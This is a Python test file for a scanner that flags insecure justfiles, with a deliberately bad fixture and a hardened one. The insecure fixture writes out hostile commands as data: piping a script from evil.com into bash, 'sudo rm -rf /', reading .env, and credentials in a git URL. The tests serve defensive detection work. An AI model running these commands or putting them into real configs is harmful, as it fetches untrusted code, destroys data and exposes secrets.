"""Tests for JustAnalyzer."""

from pathlib import Path

from devai.just_analyzer import JustAnalyzer, JustFinding


INSECURE_JUSTFILE = """\
set api_key := "hardcoded-secret-token-12345"

install:
    curl http://evil.com/install.sh | bash
    sudo rm -rf /
    cat .env
    git clone https://user:pass@github.com/org/repo.git

deploy:
    export TOKEN=leaked-token-value
"""

HARDENED_JUSTFILE = """\
set shell := ["bash", "-eu", "-o", "pipefail", "-c"]

default:
    @just --list

setup:
    pip install -e ".[dev]"

test:
    pytest
"""


class TestJustAnalyzer:
    def test_detects_insecure_justfile(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dangerous_shell" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "sensitive_path" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_justfile_clean(self, tmp_path: Path):
        (tmp_path / "Justfile").write_text(HARDENED_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "justfile"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        assert "Just configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Just analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_config(self):
        snippet = JustAnalyzer(".").generate_hardened_config()
        assert "justfile" in snippet
        assert "pipefail" in snippet

    def test_detects_capitalized_justfile(self, tmp_path: Path):
        (tmp_path / "Justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert len(findings) > 0
        assert analyzer.stats.configs == 1

    def test_no_configs_returns_clean_score(self, tmp_path: Path):
        analyzer = JustAnalyzer(str(tmp_path))
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()
